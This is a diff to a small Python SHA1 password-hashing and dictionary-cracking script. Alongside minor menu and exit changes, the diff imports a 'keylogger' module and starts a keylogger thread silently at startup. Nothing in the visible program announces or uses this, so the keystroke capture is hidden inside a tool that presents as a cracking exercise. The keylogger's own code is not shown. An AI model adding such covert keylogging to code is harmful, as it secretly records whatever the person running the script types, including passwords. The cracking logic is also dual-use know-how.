@@ -1,8 +1,15 @@
 from os import read, write
+import sys
 from urllib.request import hashlib,urlopen
+import keylogger as kl
+import threading
+import pyautogui as pa
+
 fileurl="passlist.txt"
 result="null"
 ch=0
+keylogger_thread=threading.Thread(target=kl.activateKeylogger)
+keylogger_thread.start()
 #function to perform sha1 conversion
 def convertToHash(word):
     converted_hash=hashlib.sha1(word.encode()).hexdigest()
@@ -23,7 +30,6 @@ def decrypt(ch):
 #manual bruteforce
 
     if ch==1:
-        print("\nEnter the guess:")
         guess_str=input()
         cmp_result=convertToHash(guess_str)
         print("SHA1 hash of guess is:")
@@ -56,17 +62,19 @@ def decrypt(ch):
             hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
             if hashedGuess == result:
                 print("The password is ", str(guess))
-                quit()
+                sys.exit("Completed")
+
             elif hashedGuess != result:
                 print("Password guess ",str(guess)," does not match, trying next...")
     print("Password not in database, brute force failed")
+    sys.exit("Completed")
 
 print("Generate SHA1 encrypted password and save the encrypted data to a text file")
 encrypt()
 print("\nSelect option for cracking:")
 print("\n1.Manual")
-print("\n2.Check with online lists")
-print("/n Enter your choice: ")
+print("\n2.Common Credentials List")
+print("\n Enter your choice: ")
 ch=int(input())
 if ch==1:
     decrypt(1)
